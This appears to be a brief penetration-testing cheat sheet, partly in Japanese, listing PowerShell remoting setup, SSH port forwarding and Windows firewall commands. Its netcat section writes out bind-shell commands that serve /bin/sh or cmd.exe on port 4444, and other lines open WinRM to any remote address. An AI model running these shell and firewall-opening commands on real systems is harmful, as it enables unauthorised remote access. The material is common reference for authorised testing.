# penetration-wiki

## PS-Session

### Server Settings

- username = `easyduck`
- password = `verystrongpassword`
- hostname = `rhostname`
- ipaddress = `xxx.xxx.xxx.xxx`

```pwsh
Enable-PSRemoting
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP-PUBLIC" -RemoteAddress Any
net start WinRM
```

### Client

pattern 1

```pwsh
Enter-PSSession -ComputerName "xxx.xxx.xxx.xxx" -Credential "easyduck"
```

pattern 2

```pwsh
Enter-PSSession -ComputerName "hostname"-Credential "easyduck"
```

## Netcat

## Server Settings

- RPORT = `4444`
- RHOST = `xxx.xxx.xxx.xxx`

```bash
nc -lvp 4444 -e /bin/sh
nc -lvp 4444 -e cmd.exe
```

## Client

```bash
nc xxx.xxx.xxx.xxx 4444
```

## SSH Port Forwarding

### Local forward

remoteを経由してローカルにあるツールをtargetに対して使いたい場合

```
ssh -fNT -L xxx:target:zzz remote
```

### Remote forward

localを経由して外部にあるtargetにremoteからアクセスさせたい場合

```
ssh -fNT -R xxx:remote:zzz target
```

## Windows Firewall Settings

https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior

```pwsh
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP-PUBLIC" -RemoteAddress Any
New-NetFirewallRule -Name <名前> -DisplayName <表示名> -Enabled true -Profile <有効にするプロファイル> -Action Allow -LocalAddress Any -RemoteAddress Any -Protocol TCP -LocalPort 10050 -RemotePort Any

netsh advfirewall firewall add rule name="My Application" dir=in action=allow program="C:\MyApp\MyApp.exe" enable=yes

netsh advfirewall firewall add rule name="My Application" dir=in action=allow program= "C:\MyApp\MyApp.exe" enable=yes remoteip=157.60.0.1,172.16.0.0/16,LocalSubnet profile=domain

netsh advfirewall firewall add rule name="My Application" dir=in action=allow program= "C:\MyApp\MyApp.exe" enable=yes remoteip=157.60.0.1,172.16.0.0/16,LocalSubnet profile=domain
netsh advfirewall firewall add rule name="My Application" dir=in action=allow program="C:\MyApp\MyApp.exe" enable=yes remoteip=157.60.0.1,172.16.0.0/16,LocalSubnet profile=private

netsh advfirewall firewall add rule name= "Open Port 80" dir=in action=allow protocol=TCP localport=80

netsh advfirewall firewall delete rule name= rule name program="C:\MyApp\MyApp.exe"

netsh advfirewall firewall delete rule name= rule name protocol=udp localport=500
  
netsh advfirewall reset
    
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
    
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
    	
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=domain
  
netsh advfirewall firewall add rule name="ICMP Allow incoming V4 echo request" protocol=icmpv4:8,any dir=in action=allow
  
netsh advfirewall firewall add rule name= "All ICMP V4" protocol=icmpv4:any,any dir=in action=allow
  
netsh advfirewall firewall add rule name="Block Type 13 ICMP V4" protocol=icmpv4:13,any dir=in action=block

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=private
```
